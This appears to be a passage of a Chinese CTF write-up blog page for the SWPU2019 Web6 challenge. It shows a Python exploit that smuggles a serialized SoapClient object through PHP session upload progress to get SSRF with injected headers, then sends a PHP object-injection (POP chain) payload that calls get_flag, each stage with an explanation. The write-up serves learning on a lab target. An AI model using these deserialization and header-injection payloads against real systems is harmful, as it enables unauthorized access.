class="string">&quot;|O%3A10%3A%22SoapClient%22%3A5%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22bbb%22%3Bs%3A8%3A%22location%22%3Bs%3A30%3A%22http%3A%2F%2F127.0.0.1%2Finterface.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A11%3A%22_user_agent%22%3Bs%3A108%3A%22succ3%0D%0AX-Forwarded-For%3A+127.0.0.1%0D%0ACookie%3A+user%3DxZmdm9NxaQ%3D%3D%0D%0AContent-Type%3Aapplication%2Fx-www-form-urlencoded%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D&quot;</span>)</span><br><span class="line">&#125;</span><br><span class="line">files = [</span><br><span class="line">        (<span class="string">&#x27;file&#x27;</span>, (<span class="string">&#x27;1.txt&#x27;</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">40960</span>, <span class="string">&#x27;text/plain&#x27;</span>)),</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;succ3&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">req_session = requests.post(url,cookies=cookie,data=data,files=files)</span><br><span class="line"></span><br><span class="line">url = <span class="string">&#x27;http://25b0ba10-b9fc-4f12-b7c8-44262ff9a28e.node4.buuoj.cn:81/se.php&#x27;</span></span><br><span class="line"></span><br><span class="line">cookie = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>:<span class="string">&#x27;succ3&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;aa&#x27;</span>:<span class="string">&#x27;O:2:&quot;bb&quot;:2:&#123;s:4:&quot;mod1&quot;;O:2:&quot;aa&quot;:2:&#123;s:4:&quot;mod1&quot;;N;s:4:&quot;mod2&quot;;a:1:&#123;s:5:&quot;test2&quot;;O:2:&quot;cc&quot;:3:&#123;s:4:&quot;mod1&quot;;O:2:&quot;ee&quot;:2:&#123;s:4:&quot;str1&quot;;O:2:&quot;dd&quot;:3:&#123;s:4:&quot;name&quot;;N;s:4:&quot;flag&quot;;s:8:&quot;get_flag&quot;;s:1:&quot;b&quot;;s:14:&quot;call_user_func&quot;;&#125;s:4:&quot;str2&quot;;s:7:&quot;getflag&quot;;&#125;s:4:&quot;mod2&quot;;N;s:4:&quot;mod3&quot;;N;&#125;&#125;&#125;s:4:&quot;mod2&quot;;N;&#125;&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">req_flag = requests.post(url,cookies=cookie,data=data)</span><br><span class="line"><span class="built_in">print</span>(req_flag.text)</span><br></pre></td></tr></table></figure>
+<p><strong>（1）第一阶段：利用 <code>PHP_SESSION_UPLOAD_PROGRESS</code> 反序列化</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    &#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;: parse.unquote(&quot;|O%3A10%3A%22SoapClient%22%3A5%3A...&quot;)</span><br><span class="line">&#125;</span><br><span class="line">files = [(&#x27;file&#x27;, (&#x27;1.txt&#x27;, b&#x27;a&#x27; * 40960, &#x27;text/plain&#x27;))]</span><br><span class="line">cookie = &#123;&#x27;PHPSESSID&#x27;:&#x27;succ3&#x27;&#125;</span><br><span class="line">requests.post(url, cookies=cookie, data=data, files=files)</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong><code>PHP_SESSION_UPLOAD_PROGRESS</code></strong>：
+<ul>
+<li>PHP 在上传文件时会自动记录进度，并存储在 <code>$_SESSION</code> 中。</li>
+<li>如果攻击者控制 <code>PHP_SESSION_UPLOAD_PROGRESS</code>，可以注入恶意数据。</li>
+</ul>
+</li>
+<li><strong>Payload</strong>：
+<ul>
+<li><code>|O:10:&quot;SoapClient&quot;:5:&#123;...&#125;</code> 是一个 <strong>PHP 反序列化字符串</strong>，构造了一个 <code>SoapClient</code> 对象。</li>
+<li><code>SoapClient</code> 可以发起 HTTP 请求（SSRF），用于后续攻击。</li>
+</ul>
+</li>
+</ul>
+<p><strong>（2）<code>SoapClient</code> 反序列化 SSRF</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">O:10:&quot;SoapClient&quot;:5:&#123;</span><br><span class="line">    s:3:&quot;uri&quot;;s:3:&quot;bbb&quot;;</span><br><span class="line">    s:8:&quot;location&quot;;s:30:&quot;http://127.0.0.1/interface.php&quot;;</span><br><span class="line">    s:15:&quot;_stream_context&quot;;i:0;</span><br><span class="line">    s:11:&quot;_user_agent&quot;;s:108:&quot;succ3</span><br><span class="line">X-Forwarded-For: 127.0.0.1</span><br><span class="line">Cookie: user=xZmdm9NxaQ==</span><br><span class="line">Content-Type:application/x-www-form-urlencoded&quot;;</span><br><span class="line">    s:13:&quot;_soap_version&quot;;i:1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li><strong>作用</strong>：
+<ul>
+<li>反序列化后，<code>SoapClient</code> 会向 <code>http://127.0.0.1/interface.php</code> 发起请求。</li>
+<li><code>_user_agent</code> 可控，可以伪造 HTTP 头（如 <code>X-Forwarded-For</code>、<code>Cookie</code>）。</li>
+<li>可能用于 <strong>绕过 IP 限制</strong> 或 <strong>伪造身份</strong>。</li>
+</ul>
+</li>
+</ul>
+<hr />
+<p><strong>（3）第二阶段：触发 <code>se.php</code> 反序列化</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">data = &#123;</span><br><span class="line">    &#x27;aa&#x27;: &#x27;O:2:&quot;bb&quot;:2:&#123;s:4:&quot;mod1&quot;;O:2:&quot;aa&quot;:2:&#123;...&#125;&#125;&#x27;</span><br><span class="line">&#125;</span><br><span class="line">requests.post(url, cookies=cookie, data=data)</span><br></pre></td></tr></table></figure>
+<ul>
+<li>
+<p><strong>Payload</strong>：</p>
+<ul>
+<li>
+<p>这是一个 <strong>PHP 对象注入（POP链）</strong>，利用目标代码中的 <code>unserialize()</code> 执行任意操作。</p>
+</li>
+<li>
+<p>关键部分：</p>
+  <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">O:2:&quot;dd&quot;:3:&#123;</span><br><span class="line">    s:4:&quot;name&quot;;N;</span><br><span class="line">    s:4:&quot;flag&quot;;s:8:&quot;get_flag&quot;;</span><br><span class="line">    s:1:&quot;b&quot;;s:14:&quot;call_user_func&quot;;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<ul>
+<li>调用 <code>call_user_func(&quot;get_flag&quot;)</code>，可能触发目标系统执行 <code>get_flag</code> 函数，返回敏感信息（如 flag）。</li>
+</ul>
+</li>
+</ul>
+</li>
+</ul>
+<p>输出</p>
+<p><img src="../images/20250615160555188.png" alt="image-20250615160555188" /></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SQL%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84with-rollup%E7%BB%95%E8%BF%87/" rel="tag">SQL注入中的with rollup绕过</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/SoapClient-SSRF/" rel="tag">SoapClient SSRF</a></li><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/tags/session%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">session反序列化</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/175514388679175514388612.jpg" data-sizes="auto" alt="[Black Watch 入群题]Web2" class="lazyload">
+          
+        
+        <a href="/2025/06/15/%5BBlack%20Watch%20%E5%85%A5%E7%BE%A4%E9%A2%98%5DWeb2/"></a>
+        <div class="article-nav-caption">前一篇</div>
+        <h3 class="article-nav-title">
+          
+            [Black Watch 入群题]Web2
+          
+        </h3>
+      </div>
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/1715139851115171513985117.jpg" data-sizes="auto" alt="CISCN2023-Unzip" class="lazyload">
+        
+      
+      <a href="/2025/06/13/CISCN2023-Unzip/"></a>
+      <div class="article-nav-caption">后一篇</div>
+      <h3 class="article-nav-title">
+        
+          CISCN2023-Unzip
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+</section>
+        </div>
+        
+        
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      2020-2025
+      <span class="footer-info-sep rotate"></span>
+      FuB0Y
+    </div>
+    
+      <div>
+        基于&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        284k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        20:48
+      </div>
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">总访问量&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">总访客量&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">文章目录</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="toc-number">1.</span> <span class="toc-text"> 知识点</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E4%B8%AD%E7%9A%84with-rollup"><span class="toc-number">1.1.</span> <span class="toc-text"> SQL注入中的with rollup</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="toc-number">2.</span> <span class="toc-text"> 信息收集</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%A7%A3%E9%A2%98"><span class="toc-number">3.</span> <span class="toc-text"> 解题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#with-rollup%E7%BB%95%E8%BF%87%E5%AF%86%E7%A0%81%E6%A3%80%E6%B5%8B"><span class="toc-number">3.1.</span> <span class="toc-text"> with rollup绕过密码检测</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#wsdl"><span class="toc-number">3.2.</span> <span class="toc-text"> wsdl</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%B6%8A%E6%9D%83"><span class="toc-number">3.3.</span> <span class="toc-text"> 越权</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96ssrf"><span class="toc-number">3.4.</span> <span class="toc-text"> 反序列化+ssrf</span></a></li></ol></li></ol>
+      
+  </div>
+</div>
+</div>
+      <div class="sidebar-common-sidebar hidden"><div class="sidebar-author">
+  <img data-src="/avatar/avatar.jpg" data-sizes="auto" alt="FuB0Y" class="lazyload">
+  <div class="sidebar-author-name">FuB0Y</div>
+  <div class="sidebar-description">世所谓英雄者，不以挫抑而灰心，不以失败而退怯</div>
+</div>
+<div class="sidebar-state">
+  <div class="sidebar-state-article">
+    <div>文章</div>
+    <div class="sidebar-state-number">186</div>
+  </div>
+  <div class="sidebar-state-category">
+    <div>分类</div>
+    <div class="sidebar-state-number">4</div>
+  </div>
+  <div class="sidebar-state-tag">
+    <div>标签</div>
+    <div class="sidebar-state-number">179</div>
+  </div>
+</div>
+<div class="sidebar-social">
+  
+</div>
+<div class="sidebar-menu">
+  
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/" aria-label="首页"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">首页</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/archives" aria-label="归档"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">归档</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/about" aria-label="关于"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">关于</div>
+      </div>
+    
+      <div class="sidebar-menu-link-wrap">
+        <a class="sidebar-menu-link-dummy" href="/friend" aria-label="友链"></a>
+        <div class="sidebar-menu-icon icon rotate">
+          &#xe62b;
+        </div>
+        <div class="sidebar-menu-link">友链</div>
+      </div>
+    
+  
+</div>
+</div>
+    
+  </div>
+  
+    <div class="sidebar-btn-wrapper">
+      <div class="sidebar-toc-btn current"></div>
+      <div class="sidebar-common-btn"></div>
+    </div>
+  
+</nav>
+
+    </div>
+    
+    
+<script src="https://npm.webcache.cn/lazysizes@5.3.2/lazysizes.min.js" integrity="sha384-3gT&#x2F;vsepWkfz&#x2F;ff7PpWNUeMzeWoH3cDhm&#x2F;A8jM7ouoAK0&#x2F;fP&#x2F;9bcHHR5kHq2nf+e" crossorigin="anonymous"></script>
+
+
+<script src="https://npm.webcache.cn/clipboard@2.0.11/dist/clipboard.min.js" integrity="sha384-J08i8An&#x2F;QeARD9ExYpvphB8BsyOj3Gh2TSh1aLINKO3L0cMSH2dN3E22zFoXEi0Q" crossorigin="anonymous"></script>
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+  
+<script src="/js/aos.js"></script>
+
+  <script>
+    var aosInit = () => {
+      AOS.init({
+        duration: 1000,
+        easing: "ease",
+        once: true,
+        offset: 50,
+      });
+    };
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', aosInit);
+    } else {
+      aosInit();
+    }
+  </script>
+
+
+
+<script src="/js/pjax_script.js" data-pjax></script>
+
+
+
+
+
+
+
+  
+<script src="https://npm.webcache.cn/mouse-firework@0.0.6/dist/index.umd.js" integrity="sha384-vkGvf25gm1C1PbcoD5dNfc137HzNL&#x2F;hr1RKA5HniJOaawtvUmH5lTVFgFAruE9Ge" crossorigin="anonymous"></script>
+
+  <script>
+    window.firework && window.firework(JSON.parse('{"excludeElements":["a","button"],"particles":[{"shape":"circle","move":["emit"],"easing":"easeOutExpo","colors":["#ff5252","#ff7c7c","#ffafaf","#ffd0d0"],"number":20,"duration":[1200,1800],"shapeOptions":{"radius":[16,32],"alpha":[0.3,0.5]}},{"shape":"circle","move":["diffuse"],"easing":"easeOutExpo","colors":["#ff0000"],"number":1,"duration":[1200,1800],"shapeOptions":{"radius":20,"alpha":[0.2,0.5],"lineWidth":6}}]}'))
+  </script>
+
+
+
+
+
+
+
+
+
+
+<div id="lazy-script">
+  <div>
+    
+      
+      
+      <script data-pjax>
+        window.REIMU_POST = {
+          author: "FuB0Y",
+          title: "[SWPU2019]Web6(好题)",
+          url: "http://example.com/2025/06/15/[SWPU2019]Web6(%E5%A5%BD%E9%A2%98)/",
+          excerpt: "",
+          description: "",
+          stripContent: "参考题目：LCTF2018中bestphp&#39;s revenge题 开题：   知识点  SQL注入中的with rollup 1234567后台判断逻辑：$sql=&amp;quot;select * from users where username=&amp;#x27;$name&amp;#x27; and passwd=&amp;#x27;$pass&amp;#x27;&amp;quot;;$query = mysql_query($sql); if (mysql_num_rows($query) == 1) &amp;#123;     $k",
+          date: "Sun Jun 15 2025 12:50:17 GMT+0800",
+          updated: "Sat Sep 20 2025 11:42:12 GMT+0800",
+          cover: "/images/banner.webp",
+        };
+      </script>
+       
+    
+    
+      
+        
+<script src="/js/insert_highlight.js" data-pjax></script>
+
+        
+      
+    
+    
+      <script type="module" data-pjax>
+        const PhotoSwipeLightbox = (await safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe-lightbox.esm.min.js", "sha384-DiL6M/gG+wmTxmCRZyD1zee6lIhawn5TGvED0FOh7fXcN9B0aZ9dexSF/N6lrZi/")).default;
+        
+        const pswp = () => {
+          if (_$$('.article-entry a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-entry',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          if(_$$('.article-gallery a.article-gallery-item').length > 0) {
+            new PhotoSwipeLightbox({
+              gallery: '.article-gallery',
+              children: 'a.article-gallery-item',
+              pswpModule: () => safeImport("https://npm.webcache.cn/photoswipe@5.4.4/dist/photoswipe.esm.min.js", "sha384-WkkO3GCmgkC3VQWpaV8DqhKJqpzpF9JoByxDmnV8+oTJ7m3DfYEWX1fu1scuS4+s")
+            }).init();
+          }
+          window.lightboxStatus = 'done';
+          window.removeEventListener('lightbox:ready', pswp);
+        }
+        if(window.lightboxStatus === 'ready') {
+          pswp()
+        } else {
+          window.addEventListener('lightbox:ready', pswp);
+        }
+      </script>
+      
+
+
+
+
+
+
+
+
+    
+  </div>
+</div>
+
+
+  <script>
+    console.log(String.raw`%c 
+ ______     ______     __     __    __     __  __    
+/\  == \   /\  ___\   /\ \   /\ "-./  \   /\ \/\ \   
+\ \  __<   \ \  __\   \ \ \  \ \ \-./\ \  \ \ \_\ \  
+ \ \_\ \_\  \ \_____\  \ \_\  \ \_\ \ \_\  \ \_____\ 
+  \/_/ /_/   \/_____/   \/_/   \/_/  \/_/   \/_____/ 
+                                                  
+`,'color: #ff5252;')
+    console.log('%c Theme.Reimu v' + '1.3.0' + ' %c https://github.com/D-Sketon/hexo-theme-reimu ', 'color: white; background: #ff5252; padding:5px 0;', 'padding:4px;border:1px solid #ff5252;')
+  </script>
+  
+
+
+
+  
+<script src="https://npm.webcache.cn/busuanzi@2.3.0/bsz.pure.mini.js" integrity="sha384-0M75wtSkhjIInv4coYlaJU83+OypaRCIq2SukQVQX04eGTCBXJDuWAbJet56id+S" crossorigin="anonymous" async></script>
+
+
+
+
+<script>
+  if ('serviceWorker' in navigator) {
+    navigator.serviceWorker.getRegistrations().then((registrations) => {
+      for (let registration of registrations) {
+        registration.unregister();
+      }
+    });
+  }
+</script>
+
+
+
+  
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/katex.min.js" integrity="sha384-7zkQWkzuo3B5mTepMUcHkMB5jZaolc2xDwL6VFqjFALcbeS9Ggm&#x2F;Yr2r3Dy4lfFg" crossorigin="anonymous" defer data-pjax></script>
+
+    
+<script src="https://npm.webcache.cn/katex@0.16.11/dist/contrib/auto-render.min.js" integrity="sha384-43gviWU0YVjaDtb&#x2F;GhzOouOXtZMP&#x2F;7XUzwPTstBeZFe&#x2F;+rCMvRwr4yROQP43s0Xk" crossorigin="anonymous" defer onload="renderMathInElement(document.body, {delimiters: [{left: &#39;$$&#39;, right: &#39;$$&#39;, display: true},{left: &#39;$&#39;, right: &#39;$&#39;, display: false}]});" data-pjax></script>
+
+  
+
+
+
+
+
+  </body>
+  </html>
+
